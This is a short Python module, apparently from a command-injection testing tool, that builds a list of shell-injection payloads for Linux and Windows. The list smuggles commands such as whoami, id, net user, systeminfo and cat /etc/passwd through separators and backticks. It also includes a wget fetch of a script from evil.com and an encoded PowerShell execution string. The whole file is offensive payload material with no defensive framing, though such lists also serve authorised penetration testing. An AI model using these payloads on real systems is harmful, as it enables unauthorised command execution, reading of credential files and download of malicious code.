# modules/cmd_generator.py

def generate_payloads():
    payloads = []

    # === Linux Payloads ===
    payloads += [
        "; ls",
        "&& whoami",
        "| uname -a",
        "`id`",
        "$(id)",
        "& ping -c 4 127.0.0.1",
        "; cat /etc/passwd",
    ]

    # === Windows Payloads ===
    payloads += [
        "& dir",
        "| net user",
        "&& whoami",
        "& systeminfo",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "& ping 127.0.0.1 -n 5",
    ]

    # === Obfuscation / Encoding Ready
    payloads += [
        ";%20ls%20-la",
        "`wget http://evil.com/malware.sh`",
        "| powershell -enc <base64-encoded-command>",
    ]

    return list(set(payloads))  # Remove duplicates